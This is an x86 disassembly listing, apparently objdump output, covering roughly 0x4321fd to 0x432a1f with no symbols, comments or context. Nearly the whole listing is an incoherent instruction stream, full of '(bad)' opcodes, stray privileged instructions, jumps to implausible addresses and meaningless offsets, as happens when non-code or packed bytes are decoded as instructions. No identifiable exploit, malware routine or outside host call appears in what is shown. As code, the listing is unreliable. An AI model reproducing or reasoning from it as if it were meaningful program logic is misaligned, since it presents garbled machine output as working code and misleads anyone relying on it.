  4321fd:	or     BYTE PTR [ebx+0x5510663a],0x49
  432204:	(bad)  
  432205:	repnz cmp eax,0xa0898945
  43220b:	mov    ah,0x89
  43220d:	jmp    DWORD PTR [edx+0x66b0418d]
  432213:	inc    DWORD PTR [ebp+0x50]
  432216:	add    DWORD PTR [ebp+0x3],0xffffffbe
  43221a:	mov    DWORD PTR [eax],ecx
  43221c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43221d:	pop    es
  43221e:	inc    ecx
  43221f:	(bad)  
  432220:	cwd    
  432222:	inc    ebp
  432223:	xor    ah,BYTE PTR [esi+0x3]
  432226:	dec    ebp
  432227:	push   eax
  432228:	inc    bp
  43222a:	jge    0x4321af
  43222c:	mov    esp,DWORD PTR [esi-0x18]
  43222f:	mov    esi,DWORD PTR [edi+0x7d809cfc]
  432235:	add    DWORD PTR [ebx],esi
  432237:	add    BYTE PTR [ebx],al
  432239:	test   DWORD PTR [ebx],esi
  43223b:	(bad)  
  43223c:	inc    WORD PTR [ebp+0x0]
  432240:	mov    eax,DWORD PTR [eax]
  432242:	call   0x8898d977
  432247:	mov    esi,eax
  432249:	clc    
  43224a:	ret    
  43224b:	rol    cl,0xa
  43224e:	mov    DWORD PTR ds:0x7c0ec88,esi
  432254:	mov    edx,edi
  432256:	pushf  
  432257:	pop    es
  432258:	jmp    DWORD PTR [edx+0x66]
  43225b:	add    BYTE PTR [ebp-0x990175],al
  432261:	inc    ebp
  432262:	test   DWORD PTR [ebx-0x2f00ea02],eax
  432268:	push   ebp
  432269:	mov    edi,eax
  43226b:	mov    dh,BYTE PTR [eax+0x266ff51]
  432271:	push   ebp
  432272:	add    BYTE PTR [ebx-0x764b0777],al
  432278:	dec    DWORD PTR [esi+0x661851e8]
  43227e:	add    BYTE PTR [ebp-0x7b],dl
  432281:	cmp    esi,0x3
  432284:	dec    DWORD PTR [ecx+0x51fe9285]
  43228a:	jmp    DWORD PTR [esi-0x75]
  43228d:	push   ebp
  43228e:	hlt    
  43228f:	data16 (bad) 
  432291:	dec    ebp
  432292:	ret    
  432293:	mov    ecx,DWORD PTR [ebp-0xb29b9a]
  432299:	lea    edx,[eax-0x1]
  43229c:	jne    0x43226f
  43229e:	dec    DWORD PTR [ecx-0x2f7a63f8]
  4322a4:	dec    BYTE PTR [ecx+0x51559eff]
  4322aa:	mov    DWORD PTR [esi-0x4c],esp
  4322ad:	push   ebp
  4322ae:	jmp    DWORD PTR [esi-0x18]
  4322b1:	inc    ebp
  4322b2:	sbb    BYTE PTR [ebp-0x767ad900],cl
  4322b8:	(bad)  
  4322b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4322ba:	inc    eax
  4322bc:	test   DWORD PTR [esi-0x2],esp
  4322bf:	inc    ebp
  4322c0:	dec    DWORD PTR [ebp-0x760bde75]
  4322c6:	(bad)  
  4322c7:	test   al,0xc3
  4322c9:	mov    DWORD PTR [ebp-0x769b56],ecx
  4322cf:	lods   al,BYTE PTR ds:[esi]
  4322d0:	push   eax
  4322d1:	inc    ebp
  4322d2:	jne    0x4322e3
  4322d4:	dec    DWORD PTR [ebp+0x8]
  4322d7:	mov    eax,DWORD PTR [edi]
  4322d9:	sbb    al,0x0
  4322db:	(bad)  
  4322dc:	mov    eax,0xc14fc3
  4322e1:	mov    DWORD PTR [eax-0x64],edi
  4322e4:	inc    bp
  4322e6:	test   DWORD PTR [edi],ecx
  4322e8:	dec    DWORD PTR [ebp-0x1]
  4322eb:	xor    eax,edi
  4322ed:	add    ecx,DWORD PTR [ecx-0x99bdcd]
  4322f3:	inc    ebp
  4322f4:	xor    DWORD PTR [ebx],0x43
  4322f7:	mov    WORD PTR [ebp-0x1bc],ax
  4322fe:	lea    ecx,[ecx-0x7677fe]
  432304:	inc    esi
  432305:	(bad)  
  432306:	call   FWORD PTR [ebp+ecx*4-0x3e72be01]
  43230d:	pushf  
  43230e:	rol    DWORD PTR [ebp-0x72019a],0xff
  432315:	add    bh,bh
  432317:	add    BYTE PTR [edi],cl
  432319:	test   DWORD PTR [eax],eax
  43231b:	(bad)  
  43231c:	dec    WORD PTR [ebp-0xff002d]
  432323:	mov    DWORD PTR [eax-0x48],esi
  432326:	add    bh,bh
  432328:	lea    cx,[ebp-0x50]
  43232f:	push   eax
  432330:	rol    BYTE PTR [ebp+0x0],1
  432333:	xor    esp,DWORD PTR [esi+0x3]
  432336:	lea    edx,[eax-0x1]
  432339:	test   edi,edi
  43233b:	dec    DWORD PTR [ebp-0x1]
  43233e:	mov    edi,edi
  432340:	dec    eax
  432341:	clc    
  432342:	call   DWORD PTR [ebp-0x73]
  432345:	lea    esi,[eax+0x51ffff88]
  43234b:	lea    ecx,[ebp-0x78]
  43234e:	test   WORD PTR [ebp-0x2],ax
  432355:	popf   
  432356:	push   ecx
  432357:	add    BYTE PTR [ecx-0x77],dl
  43235a:	xor    edi,DWORD PTR [eax-0x724a007d]
  432360:	cdq    
  432361:	mov    al,0x32
  432363:	inc    DWORD PTR [ebx]
  432365:	push   eax
  432366:	push   ecx
  432367:	inc    ebp
  432368:	shl    BYTE PTR [ebx],1
  43236a:	lea    eax,[ebx]
  43236c:	call   DWORD PTR [eax-0x1]
  43236f:	test   DWORD PTR [ebx],esi
  432371:	inc    DWORD PTR [eax-0x1]
  432374:	(bad)  
  432375:	(bad)  
  432376:	(bad)  
  432377:	clc    
  432378:	call   DWORD PTR [ebp+0x50]
  43237b:	jmp    0xcc24f5
  432380:	inc    esp
  432381:	jae    0x432382
  432383:	add    BYTE PTR [ecx-0x384f73],cl
  432389:	mov    DWORD PTR [ebx-0x7f0003c0],ecx
  43238f:	mov    eax,DWORD PTR [ecx]
  432391:	data16 add BYTE PTR [ebp-0xb50077],al
  432398:	inc    eax
  43239a:	lea    esp,[esi+0x1c]
  43239d:	test   DWORD PTR [ecx-0xb301],ecx
  4323a3:	inc    edi
  4323a4:	(bad)  
  4323a5:	dec    si
  4323a7:	test   edi,edi
  4323a9:	push   DWORD PTR [ecx]
  4323ab:	(bad)  
  4323ac:	jnp    0x4323fd
  4323ae:	(bad)  
  4323af:	mov    edx,DWORD PTR [edx-0x7d]
  4323b2:	(bad)  
  4323b3:	mov    ebx,0x563a8935
  4323b8:	(bad)  
  4323b9:	call   FWORD PTR [esi-0x47]
  4323bc:	inc    DWORD PTR ds:0x893000e2
  4323c2:	(bad)  
  4323c3:	pop    eax
  4323c4:	mov    ah,0xff
  4323c6:	(bad)  
  4323c7:	mov    ecx,0x5745
  4323cc:	dec    DWORD PTR [ecx-0xf7a501]
  4323d2:	(bad)  
  4323d3:	mov    ecx,0x456108
  4323d8:	mov    ecx,DWORD PTR [ecx-0x3fa3e4]
  4323de:	test   BYTE PTR [ebp-0x72ff23fd],cl
  4323e4:	inc    BYTE PTR gs:[eax]
  4323e7:	inc    DWORD PTR [ebp-0x73]
  4323ea:	ss (bad) 
  4323ec:	pushf  
  4323ed:	inc    edi
  4323ef:	mov    ebx,eax
  4323f1:	hlt    
  4323f2:	test   DWORD PTR [ecx-0xbab708],ecx
  4323f8:	cmp    bh,BYTE PTR [esi+0x7c7089c]
  4323fe:	lock into 
  432400:	test   eax,eax
  432402:	clc    
  432403:	mov    ebx,0x367245
  432408:	lahf   
  432409:	retf   
  43240a:	mov    ecx,DWORD PTR [ebx+0x40808dfc]
  432410:	add    edi,edi
  432412:	add    BYTE PTR [ecx+0x45],dl
  432415:	ror    BYTE PTR [ebx+0x4d44fc8d],0xff
  43241c:	mov    edx,DWORD PTR [ecx-0x74]
  43241f:	inc    DWORD PTR [eax]
  432421:	cld    
  432422:	mov    eax,DWORD PTR [ebp-0x6f0175]
  432428:	add    BYTE PTR [ebp-0x1b0177],al
  43242e:	jge    0x432475
  432430:	test   DWORD PTR [ebx+0xff9875],ecx
  432436:	sbb    BYTE PTR [esi+0x55],ah
  432439:	xchg   ebp,eax
  43243a:	call   0x431f3e
  43243f:	push   edi
  432440:	inc    ebp
  432441:	mov    dx,WORD PTR [ebp-0xfc0075]
  432448:	cmp    al,0x85
  43244a:	ud0    eax,DWORD PTR [ebp-0x1]
  43244e:	test   DWORD PTR [edi+0x74],ecx
  432451:	dec    edi
  432452:	inc    DWORD PTR [ebp-0xf70004]
  432458:	dec    DWORD PTR [edi-0x75]
  43245b:	dec    edi
  43245c:	cld    
  43245d:	test   DWORD PTR [eax+0xff01ff],eax
  432463:	icebp  
  432464:	add    BYTE PTR [edi-0x3a],cl
  432467:	test   ebx,eax
  432469:	inc    BYTE PTR [ebp-0x1]
  43246c:	jne    0x43246e
  43246e:	mov    eax,DWORD PTR [eax]
  432470:	cld    
  432471:	xor    BYTE PTR [ecx+0x500155],cl
  432477:	push   ebp
  432478:	xor    DWORD PTR [ecx+0x45011c80],ecx
  43247e:	add    BYTE PTR [ebp+0x35e90f50],al
  432484:	add    al,BYTE PTR [eax]
  432486:	add    BYTE PTR [ebx-0x38fe4f80],al
  43248c:	add    ah,ch
  43248e:	or     BYTE PTR [ebp+0x4501f845],dh
  432494:	jmp    0xdf278f
  432499:	(bad)  
  43249a:	nop    ecx
  43249d:	test   DWORD PTR [ebp+0x4502f8],eax
  4324a3:	cmp    BYTE PTR [ebp-0x64],cl
  4324a6:	mov    eax,edi
  4324a8:	mov    ebx,DWORD PTR [eax+edx*2]
  4324ab:	add    eax,0x45fef885
  4324b0:	dec    DWORD PTR [ebx+0x339445]
  4324b6:	add    ecx,DWORD PTR [ecx+0x4500f889]
  4324bc:	dec    DWORD PTR [ebx-0x460f0375]
  4324c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4324c3:	add    esi,edi
  4324c5:	add    bh,bh
  4324c7:	rdpmc  
  4324c9:	add    BYTE PTR [ebx],0x1
  4324cc:	mov    DWORD PTR [eax],eax
  4324ce:	add    al,0x45
  4324d0:	dec    DWORD PTR [ecx-0x360b3373]
  4324d6:	dec    DWORD PTR [esi]
  4324d8:	push   eax
  4324d9:	jne    0x432520
  4324db:	mov    esi,DWORD PTR [ebx]
  4324dd:	cld    
  4324de:	add    ebp,ebx
  4324e0:	push   eax
  4324e1:	inc    DWORD PTR [ebp-0x75]
  4324e4:	add    eax,0x800e4
  4324e9:	add    BYTE PTR [ebx-0x7f7403bf],cl
  4324ef:	mov    DWORD PTR [ecx],eax
  4324f1:	sbb    al,0x0
  4324f3:	leave  
  4324f4:	test   DWORD PTR [edi-0x2],eax
  4324f7:	jne    0x4324f8
  4324f9:	call   0xff440ffe
  4324fe:	xor    BYTE PTR [ebp+0x4d],al
  432501:	mov    edi,edi
  432503:	enter  0x8,0x4d
  432507:	mov    ecx,DWORD PTR [ebx-0x7fc74cd]
  43250d:	mov    eax,DWORD PTR [eax]
  43250f:	cld    
  432510:	add    DWORD PTR [ecx],ebx
  432512:	inc    ebp
  432513:	dec    ebp
  432514:	mov    DWORD PTR [ebx+0x1ccc8b],ecx
  43251a:	inc    eax
  43251b:	dec    DWORD PTR [ecx-0x270375]
  432521:	add    BYTE PTR [ebx-0x39d72701],cl
  432527:	xchg   ecx,eax
  432528:	ret    
  432529:	add    BYTE PTR [ebp-0x830075],al
  43252f:	add    BYTE PTR [ebp-0x75],al
  432532:	mov    DWORD PTR [ebp+0x8ff0404],ecx
  432538:	lea    edi,[edi-0xc]
  43253b:	add    bh,bh
  43253d:	mov    edx,DWORD PTR [eax-0x7b]
  432540:	inc    ebp
  432541:	rdpmc  
  432543:	jne    0x432548
  432545:	add    BYTE PTR [eax-0x75],dl
  432548:	inc    ebp
  432549:	clc    
  43254a:	add    eax,0x400009
  43254f:	mov    DWORD PTR [ebx-0x7f000304],ecx
  432555:	mov    eax,DWORD PTR [ecx]
  432557:	in     al,dx
  432558:	add    dh,al
  43255a:	test   ebx,eax
  43255c:	inc    BYTE PTR [ebp-0xff0001]
  432562:	add    BYTE PTR [ebp-0x43],al
  432565:	cmp    esi,0xfffffff8
  432568:	(bad)  
  432569:	push   DWORD PTR [eax]
  43256b:	add    BYTE PTR [ebp-0x3a],dl
  43256e:	test   ebx,eax
  432570:	je     0x4324f7
  432572:	mov    edi,edi
  432574:	sbb    al,0xff
  432576:	test   DWORD PTR gs:[eax],eax
  432579:	(bad)  
  43257a:	js     0x43257b
  43257c:	add    BYTE PTR [ebx-0x39b20bdd],cl
  432582:	sub    eax,ebx
  432584:	mov    ecx,DWORD PTR [ebx-0x55130377]
  43258a:	add    eax,DWORD PTR [eax]
  43258c:	dec    ebp
  43258d:	push   eax
  43258e:	mov    al,BYTE PTR [ebp+0x1]
  432591:	mov    eax,DWORD PTR [ebp-0x68]
  432594:	mov    eax,DWORD PTR [eax]
  432596:	sbb    bh,al
  432598:	or     ah,dh
  43259a:	dec    ebp
  43259b:	inc    DWORD PTR [eax+0x4]
  43259e:	push   ecx
  43259f:	add    BYTE PTR [edx-0x1],dh
  4325a2:	mov    ecx,DWORD PTR [ecx+0x55cfe83c]
  4325a8:	or     DWORD PTR [ebx-0x7ff3400],0x8b5545d7
  4325b2:	add    ecx,DWORD PTR [ecx-0x1be77477]
  4325b8:	push   ecx
  4325b9:	cmp    BYTE PTR [ebx],al
  4325bb:	inc    ebp
  4325bc:	mov    DWORD PTR [ebx-0x7aaaafe4],ecx
  4325c2:	(bad)  
  4325c3:	(bad)  
  4325c4:	in     al,0xff
  4325c6:	add    BYTE PTR [ebp+0x0],al
  4325c9:	xor    eax,DWORD PTR [eax-0x7c76fffd]
  4325cf:	add    al,bh
  4325d1:	(bad)  
  4325d2:	jmp    0x8d85:0x74b0558d
  4325d9:	dec    DWORD PTR [eax]
  4325db:	call   DWORD PTR [ebp-0x7b]
  4325de:	mov    edi,esi
  4325e0:	lock call DWORD PTR [ebp-0x75]
  4325e4:	mov    esi,esp
  4325e6:	mov    ah,0xc6
  4325e8:	mov    bh,0xc3
  4325ea:	mov    DWORD PTR [ebx-0x110003c4],ecx
  4325f0:	add    DWORD PTR [eax],0x450050ff
  4325f6:	mov    DWORD PTR [ebx+0x9598cc],ecx
  4325fc:	inc    edi
  4325fe:	push   esp
  432600:	jmp    0xcd00:0x670481ff
  432607:	mov    DWORD PTR [ebx],esi
  432609:	clc    
  43260a:	cmp    edi,0xff9cff3b
  432610:	jne    0x43261a
  432612:	mov    eax,eax
  432614:	add    esi,DWORD PTR [eax]
  432616:	int3   
  432617:	inc    ebp
  432618:	cmp    al,0x83
  43261a:	add    BYTE PTR [eax],bl
  43261c:	adc    DWORD PTR [ebx+0x768b5055],eax
  432622:	add    ecx,DWORD PTR [ebx-0x30ba17c7]
  432628:	mov    edi,eax
  43262a:	cmp    BYTE PTR [ebp+0x45],cl
  43262d:	jmp    0x4325ba
  43262f:	mov    ebx,DWORD PTR [esp+ebp*8]
  432632:	inc    ebp
  432633:	or     al,0x2
  432635:	dec    DWORD PTR [ebp+0x18]
  432638:	jne    0x43268f
  43263a:	mov    ecx,DWORD PTR [eax+0x1c558bf8]
  432640:	mov    edi,DWORD PTR [ebx]
  432642:	in     al,0x50
  432644:	xchg   ecx,eax
  432645:	jmp    0x343754a
  43264a:	adc    al,0x8b
  43264c:	inc    ebp
  43264d:	mov    al,ds:0x8b04008b
  432652:	push   ebp
  432653:	sub    ecx,DWORD PTR [ecx-0x2d381318]
  432659:	push   ebp
  43265a:	test   DWORD PTR [ebx-0x2800d701],ecx
  432660:	inc    ebp
  432661:	dec    ebp
  432662:	mov    DWORD PTR [ecx+0x45ffb8f8],ecx
  432668:	mov    DWORD PTR [eax],0xe9ff00f4
  43266e:	add    al,0x0
  432670:	add    BYTE PTR [eax],al
  432672:	mov    eax,edx
  432674:	push   eax
  432675:	rol    DWORD PTR [ebp-0xf0177],1
  43267b:	bound  eax,QWORD PTR [ebp+0x50]
  43267e:	xor    ecx,DWORD PTR [ecx+0x5589b403]
  432684:	add    BYTE PTR [ecx+0x558df0ff],cl
  43268a:	mov    al,0xf
  43268c:	test   DWORD PTR [edx],edx
  43268e:	call   DWORD PTR [ebp-0x7a0001]
  432694:	(bad)  
  432695:	loop   0x432696
  432697:	jnp    0xc6991a9d
  43269d:	mov    eax,ebx
  43269f:	cmp    al,0x8b
  4326a1:	(bad)  
  4326a2:	cld    
  4326a3:	shr    esi,0xc
  4326a6:	add    dl,al
  4326a8:	push   eax
  4326a9:	lea    eax,[ebp-0x1]
  4326ac:	mov    edx,esi
  4326ae:	cwde   
  4326af:	cli    
  4326b0:	add    BYTE PTR [ebp+0x1ffff8ff],al
  4326b6:	or     BYTE PTR [eax],cl
  4326b8:	inc    ebp
  4326b9:	dec    ebp
  4326ba:	inc    DWORD PTR [ebx+0x74803914]
  4326c0:	add    DWORD PTR [ebx+0x451800],ecx
  4326c6:	call   DWORD PTR [eax+edx*1]
  4326c9:	add    ecx,DWORD PTR [ebp-0x34]
  4326cc:	push   edi
  4326cd:	adc    al,0x8
  4326cf:	mov    edx,DWORD PTR [ebp-0x14]
  4326d2:	mov    ecx,DWORD PTR [ebp+0x18]
  4326d5:	add    DWORD PTR [ebp-0x4c],0xffffff8d
  4326d9:	inc    DWORD PTR [eax+esi*8]
  4326dc:	inc    ebp
  4326dd:	stos   BYTE PTR es:[edi],al
  4326de:	mov    edx,DWORD PTR [ebp-0x4]
  4326e1:	add    DWORD PTR [ebp-0x1c],eax
  4326e4:	mov    edx,DWORD PTR [ebp-0x70]
  4326e7:	cmp    eax,DWORD PTR [eax]
  4326e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4326ea:	mov    eax,DWORD PTR [eax]
  4326ec:	cld    
  4326ed:	jae    0x43266f
  4326ef:	add    eax,DWORD PTR [ecx]
  4326f1:	clc    
  4326f2:	add    BYTE PTR [eax+0x30],dl
  4326f5:	mov    DWORD PTR [ecx],esi
  4326f7:	clc    
  4326f8:	pop    ds
  4326f9:	inc    ebp
  4326fa:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  432700:	(bad)  
  432701:	push   DWORD PTR [edi]
  432703:	mov    ecx,DWORD PTR [ebx+0x398503e8]
  432709:	(bad)  
  43270a:	jae    0x43270b
  43270c:	mov    eax,DWORD PTR [ebp-0x740175]
  432712:	sub    eax,DWORD PTR [eax]
  432714:	add    eax,DWORD PTR [eax]
  432716:	mov    DWORD PTR [ecx+0x5f],eax
  432719:	mov    DWORD PTR [ebx-0x4],ebx
  43271c:	ret    0xff
  43271f:	mov    ecx,DWORD PTR [ebx+0x1cc683d8]
  432725:	ret    
  432726:	mov    eax,DWORD PTR [ebp-0x6f0075]
  43272c:	add    BYTE PTR [ebp-0x7d],al
  43272f:	mov    DWORD PTR [eax],eax
  432731:	add    al,0x84
  432733:	inc    DWORD PTR [ecx]
  432735:	lea    eax,[eax]
  432737:	hlt    
  432738:	sar    bh,cl
  43273a:	test   BYTE PTR [eax+0x1],dl
  43273d:	inc    ebp
  43273e:	add    BYTE PTR [ebx],dh
  432740:	test   BYTE PTR [ebx],0x84
  432743:	push   eax
  432744:	add    BYTE PTR [ebp+0x0],al
  432747:	add    eax,0x86
  43274c:	add    BYTE PTR [ebx-0x7f7b0340],cl
  432752:	add    BYTE PTR [ecx],al
  432754:	add    BYTE PTR [eax],al
  432756:	mov    esi,0x550030
  43275b:	mov    ecx,DWORD PTR [edi]
  43275d:	cld    
  43275e:	fidiv  DWORD PTR [ebp+0x0]
  432761:	mov    edi,DWORD PTR [ecx]
  432763:	xor    BYTE PTR [eax+eax*1],0x84
  432767:	add    eax,DWORD PTR [eax]
  432769:	sbb    BYTE PTR [eax],al
  43276b:	jne    0x43271e
  43276d:	mov    eax,DWORD PTR [ecx]
  43276f:	sbb    BYTE PTR [eax],al
  432771:	mov    DWORD PTR [ebp-0x1],esp
  432774:	add    BYTE PTR [eax+0x30e45ca],bh
  43277a:	ret    0xb7fc
  43277d:	dec    ebp
  43277e:	or     al,0x89
  432780:	dec    ebp
  432781:	cld    
  432782:	cmovne ecx,DWORD PTR [eax-0x75]
  432786:	add    edi,esp
  432788:	seto   BYTE PTR [esi-0x72ffffff]
  43278f:	inc    ebp
  432790:	adc    al,0x8b
  432792:	mov    DWORD PTR [eax+ebp*8-0x740100],ecx
  432799:	cmp    DWORD PTR [edi+0x72],edx
  43279c:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  4327a2:	gs cmp al,0x0
  4327a5:	je     0x43277d
  4327a7:	push   eax
  4327a8:	sar    BYTE PTR [eax],1
  4327aa:	mov    bh,0x3e
  4327ac:	push   cs
  4327ad:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  4327b3:	add    DWORD PTR [ecx+0x12],ebp
  4327b6:	dec    edx
  4327b7:	(bad)  
  4327b8:	mov    eax,edx
  4327ba:	in     al,dx
  4327bb:	adc    DWORD PTR [ecx],esi
  4327bd:	pop    esi
  4327be:	inc    ecx
  4327bf:	leave  
  4327c0:	or     DWORD PTR [eax],ebx
  4327c2:	gs push ebp
  4327c4:	add    ah,ch
  4327c6:	into   
  4327c7:	in     al,dx
  4327c8:	enter  0xb756,0xf0
  4327cc:	push   cs
  4327cd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  4327d7:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  4327dd:	jnp    0x7443ace5
  4327e3:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  4327e9:	add    BYTE PTR [edi],cl
  4327eb:	mov    edi,DWORD PTR [ecx-0x78]
  4327ee:	ltr    WORD PTR [ecx-0x7b]
  4327f2:	dec    DWORD PTR [edi]
  4327f4:	clc    
  4327f5:	out    0x45,eax
  4327f7:	add    BYTE PTR [eax],cl
  4327f9:	cmp    ebx,0xffffff8c
  4327fc:	jge    0x4327fe
  4327fe:	jb     0x432810
  432800:	je     0x522880
  432806:	pop    edx
  432807:	push   esi
  432808:	mov    ecx,DWORD PTR [edi]
  43280a:	in     al,dx
  43280b:	rol    DWORD PTR [ebp+0x0],1
  43280e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  432815:	cmp    DWORD PTR [ecx],0xfffffff0
  432818:	hlt    
  432819:	mov    esp,DWORD PTR [eax+0xf034d2b]
  43281f:	(bad)  
  432821:	push   eax
  432822:	jns    0xb8430ca0
  432828:	lock push cs
  43282a:	ror    edx,0x3
  43282d:	test   BYTE PTR [ecx+0x5500e800],cl
  432833:	dec    eax
  432834:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  432838:	(bad)  
  432839:	mov    esi,0x7f33ff5f
  43283e:	inc    eax
  43283f:	test   DWORD PTR [edx],eax
  432841:	je     0x432803
  432843:	mov    ecx,ecx
  432845:	adc    DWORD PTR [ebp-0xc],0xffffffec
  432849:	and    eax,DWORD PTR [eax+0xf0103]
  43284f:	jp     0x43283d
  432851:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  432855:	add    edx,DWORD PTR [edi+0x74]
  432858:	sbb    BYTE PTR [ebp+0x4d001484],cl
  43285e:	add    BYTE PTR [ebp-0x74c48bbb],al
  432864:	je     0x4327e9
  432866:	cmp    eax,edi
  432868:	js     0x43288d
  43286a:	add    eax,0xeb0fc003
  43286f:	jns    0x4327fc
  432871:	vmread DWORD PTR [ecx+0x45],ebx
  432875:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  43287b:	adc    al,0x8b
  43287d:	jge    0x432893
  43287f:	mov    edi,DWORD PTR [eax-0x4]
  432882:	add    edi,DWORD PTR [edi]
  432884:	or     bh,bh
  432886:	push   ebp
  432887:	push   es
  432888:	mov    DWORD PTR [ebp-0x4],ebx
  43288b:	add    edi,esi
  43288d:	pop    es
  43288e:	add    esi,DWORD PTR [edi-0x48ccf183]
  432894:	mov    DWORD PTR [esp+esi*8],ecx
  432897:	inc    ebp
  432898:	pop    ebp
  432899:	xor    DWORD PTR [esi-0x4],0x3b
  43289d:	add    edx,DWORD PTR [ecx+edi*1]
  4328a0:	push   es
  4328a1:	clc    
  4328a2:	mov    bh,0xdb
  4328a4:	jp     0x43285d
  4328a6:	add    cl,BYTE PTR [esi]
  4328a8:	div    DWORD PTR [edi+0x4d8b0c1c]
  4328ae:	test   edi,edi
  4328b0:	je     0x4328a6
  4328b2:	mov    eax,ecx
  4328b4:	or     BYTE PTR [ebx],al
  4328b6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  4328bc:	jbe    0x432930
  4328be:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  4328c4:	add    ecx,DWORD PTR [esi]
  4328c6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  4328cc:	add    eax,DWORD PTR [ebx-0x287af783]
  4328d2:	je     0x432921
  4328d4:	mov    DWORD PTR [ecx],edi
  4328d6:	mov    esi,eax
  4328d8:	hlt    
  4328d9:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  4328e0:	jb     0x4328a2
  4328e2:	jmp    0x4328cf
  4328e4:	xor    esi,DWORD PTR [ebx]
  4328e6:	pop    edi
  4328e7:	pop    esi
  4328e8:	pop    ebx
  4328e9:	ret    
  4328ea:	ret    0x8b
  4328ed:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  4328f3:	xor    DWORD PTR [esi],0xc
  4328f6:	pushf  
  4328f7:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  4328fd:	(bad)  
  4328ff:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  432906:	dec    ebp
  432907:	ret    
  432908:	mov    edi,DWORD PTR [esi-0x4]
  43290b:	pop    eax
  43290c:	dec    ebp
  43290d:	jne    0x43289a
  43290f:	xor    edi,esp
  432911:	inc    eax
  432912:	dec    ebp
  432913:	jbe    0x432968
  432915:	inc    eax
  432916:	pop    ebp
  432917:	add    edx,DWORD PTR [esi+0x8]
  43291a:	push   ecx
  43291b:	dec    eax
  43291c:	push   ecx
  43291d:	mov    eax,edi
  43291f:	and    al,0xf0
  432921:	jo     0x43290e
  432923:	mov    eax,DWORD PTR [ebx]
  432925:	sbb    BYTE PTR [ebp+0x4d],cl
  432928:	mov    eax,DWORD PTR [ebx]
  43292a:	nop
  43292b:	or     BYTE PTR [eax],al
  43292d:	jne    0x432986
  43292f:	cmp    ebx,DWORD PTR [ecx+0x33893277]
  432935:	cld    
  432936:	xor    edi,edi
  432938:	add    edi,DWORD PTR [ebp+0x3]
  43293b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  432941:	js     0x4328c7
  432943:	jae    0x432947
  432945:	(bad)  
  432947:	xor    al,0x5d
  432949:	jmp    0x4328d6
  43294b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  432952:	fdecstp 
  432954:	test   BYTE PTR [edi],ah
  432956:	add    bh,BYTE PTR [ebp+0x0]
  432959:	add    ebx,DWORD PTR [ebp-0x77]
  43295c:	mov    edi,eax
  43295e:	cmp    al,0x0
  432961:	adc    dh,BYTE PTR [ebx]
  432963:	jge    0x432968
  432965:	mov    edi,DWORD PTR [ebx]
  432967:	jl     0x432978
  432969:	clc    
  43296a:	dec    edi
  43296b:	jge    0x43296d
  43296d:	mov    eax,DWORD PTR [ebx]
  43296f:	jb     0x432979
  432971:	mov    ecx,DWORD PTR [ebp-0x8]
  432974:	mov    edi,edi
  432976:	xor    edx,DWORD PTR [eax]
  432978:	add    edi,DWORD PTR [ebx]
  43297a:	mov    DWORD PTR [ebp-0x10],edi
  43297d:	inc    edi
  43297e:	pop    ebp
  43297f:	jge    0x4329bc
  432981:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  432985:	mov    edx,0xc05d87f0
  43298a:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  43298e:	fimul  WORD PTR [eax]
  432990:	fist   WORD PTR [ebp+0x1c]
  432993:	in     al,dx
  432994:	jne    0x432982
  432996:	mov    edi,DWORD PTR [edx-0x7a27a10]
  43299c:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  4329a0:	fdivp  st(0),st
  4329a2:	fild   WORD PTR [ebp+0x4510f85c]
  4329a8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  4329ae:	inc    ebp
  4329af:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  4329b5:	mov    ebp,DWORD PTR [ebx-0x4]
  4329b8:	adc    al,0x8b
  4329ba:	rcl    DWORD PTR [eax],0x48
  4329bd:	mov    esi,0x7080803
  4329c2:	fiadd  WORD PTR [ebp+0x4d]
  4329c5:	mov    WORD PTR [ebx+0x558bfc52],cs
  4329cb:	cld    
  4329cc:	xor    ebx,DWORD PTR [ebx+0x330103]
  4329d2:	mov    DWORD PTR [edi+0x872dc],edi
  4329d8:	xlat   BYTE PTR ds:[ebx]
  4329d9:	into   
  4329da:	ffreep st(6)
  4329dc:	retf   0x6c7
  4329df:	iret   
  4329e0:	dec    ebp
  4329e1:	inc    ebp
  4329e2:	mov    DWORD PTR [ebx],edi
  4329e4:	fmul   QWORD PTR [edi]
  4329e6:	dec    ebp
  4329e7:	jnp    0x432a1c
  4329e9:	add    BYTE PTR [ebx],al
  4329eb:	mov    ecx,DWORD PTR [esp+edi*8]
  4329ee:	inc    ebp
  4329ef:	dec    ebp
  4329f0:	lea    esi,[ebx]
  4329f2:	add    DWORD PTR [ebx],eax
  4329f4:	jb     0x432a31
  4329f6:	add    BYTE PTR [edi],cl
  4329f8:	inc    ebp
  4329f9:	imul   eax,edi,0x858bd800
  4329ff:	cld    
  432a00:	clc    
  432a01:	mov    DWORD PTR [ebp+0x0],eax
  432a04:	inc    DWORD PTR [eax]
  432a06:	or     al,0xde
  432a08:	sbb    bh,0x1
  432a0b:	retf   
  432a0c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  432a13:	dec    ebp
  432a14:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  432a1a:	enter  0x12de,0xdf
  432a1e:	inc    ebp
  432a1f:	pop    ebp
